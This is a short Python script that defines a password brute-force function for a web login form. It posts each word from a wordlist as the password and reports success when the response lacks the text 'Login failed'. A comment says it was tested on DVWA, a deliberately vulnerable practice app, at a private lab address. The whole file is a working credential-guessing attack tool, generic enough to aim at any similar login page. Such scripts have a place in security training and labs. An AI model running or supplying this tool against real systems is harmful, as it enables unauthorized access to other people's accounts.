#!usr/bin/env python3
import requests
import os
import sys
from UI.colors import *

def bruteforce_login(target_url:str, wordlist_file:str, post_values:dict):
    # tested on DVWA web app.
    # target_url = "http://10.0.2.30/dvwa/login.php"
    # wordlist_file = "full_path_to_wordlist"
    # post_values = {"username":"admin", "password":"", "Login":"submit"}

    if os.path.isfile(wordlist_file):
        print(BRIGHT_WHITE + '[*] Wordlist File Found! Starting Bruteforce Attack!!')
        with open(wordlist_file,'r') as wordlist:
            for word in wordlist:
                password = word.strip()
                post_values['password'] = password
                post_response = requests.post(target_url, data=post_values)
                content = str(post_response.content)
                if "Login failed" not in content:
                    print(BRIGHT_YELLOW + '[*] Password Found! : ' + password)
                    sys.exit()

        print(BRIGHT_RED + '[!] Password Not Found!')

    else:
        print(BRIGHT_RED + '[-] Wordlist Not Found.')
